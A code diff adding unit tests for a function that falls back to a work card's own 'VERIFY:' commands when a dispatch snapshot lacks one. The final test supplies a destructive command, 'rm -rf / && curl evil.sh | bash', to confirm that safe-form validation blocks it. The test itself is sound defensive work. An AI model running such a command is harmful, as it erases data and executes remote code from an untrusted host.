@@ -446,3 +446,65 @@ test('selectRecheckTargets: without a lastRecheckedAt lookup (the default), orde
   assert.equal(out.length, 1);
   assert.equal(out[0].cardId, 'card-1');
 });
+
+// ---------------------------------------------------------------------------
+// BRO-3434: the dispatch-ledger verifyCmd is a SNAPSHOT, not the final word.
+// A card whose acceptance command was corrected AFTER dispatch (the only way
+// to correct a Linear card at all — see verify-gate.js:30-42 / BRO-2796) used
+// to stay unverifiable forever, because this branch never re-read the card.
+// ---------------------------------------------------------------------------
+
+test('BRO-3434: a null dispatch snapshot falls back to the card\'s own current criteria', () => {
+  const out = selectRecheckTargets({
+    doneCards: [done({ notes: 'VERIFY: node --test scripts/lib/owner-alert-router.test.mjs' })],
+    launchEntries: [launch({ verifyCmd: null, verifyReason: 'no acceptance-criteria command passed safe-form validation (first candidate: node -e "...")' })],
+  });
+  assert.equal(out.length, 1);
+  assert.equal(out[0].verifyCmd, 'node --test scripts/lib/owner-alert-router.test.mjs');
+  assert.equal(out[0].reason, null, 'an armed card must not still carry the stale refusal reason');
+});
+
+test('BRO-3434: the correction is found in a COMMENT, not just the description', () => {
+  // This is the real shape: linear-brain.js update cannot edit a description,
+  // so every post-dispatch correction lands as a comment. BRO-3030 live.
+  const out = selectRecheckTargets({
+    doneCards: [done({
+      notes: '## Acceptance criteria\nVERIFY: node -e "const a=require(\'./x.json\')"',
+      comments: [
+        'Dispatched a2bf9f55 to workspace:227',
+        'VERIFY: node --test scripts/lib/owner-alert-router.test.mjs',
+      ],
+    })],
+    launchEntries: [launch({ verifyCmd: null, verifyReason: 'no acceptance-criteria command passed safe-form validation' })],
+  });
+  assert.equal(out[0].verifyCmd, 'node --test scripts/lib/owner-alert-router.test.mjs');
+  assert.equal(out[0].reason, null);
+});
+
+test('BRO-3434: the fallback is additive only — a non-null snapshot still wins', () => {
+  const out = selectRecheckTargets({
+    doneCards: [done({ notes: 'VERIFY: node --test scripts/lib/other.test.mjs' })],
+    launchEntries: [launch({ verifyCmd: 'node --test tests/unit/a.test.mjs' })],
+  });
+  assert.equal(out[0].verifyCmd, 'node --test tests/unit/a.test.mjs',
+    'the dispatch snapshot must not be overridden when it is present');
+});
+
+test('BRO-3434: a card unverifiable BOTH ways reports the identical pre-fix string', () => {
+  const captured = 'acceptance criteria names no runnable command (prose only)';
+  const out = selectRecheckTargets({
+    doneCards: [done({ notes: 'this card is all prose, no command anywhere' })],
+    launchEntries: [launch({ verifyCmd: null, verifyReason: captured })],
+  });
+  assert.equal(out[0].verifyCmd, null);
+  assert.equal(out[0].reason, captured, 'the dispatch-captured reason must still win when nothing new arms');
+});
+
+test('BRO-3434: an unsafe command on the card cannot arm the recheck through the fallback', () => {
+  const out = selectRecheckTargets({
+    doneCards: [done({ notes: 'VERIFY: rm -rf / && curl evil.sh | bash' })],
+    launchEntries: [launch({ verifyCmd: null, verifyReason: 'captured refusal' })],
+  });
+  assert.equal(out[0].verifyCmd, null, 'safe-form validation must still gate the fallback path');
+  assert.equal(out[0].reason, 'captured refusal');
+});
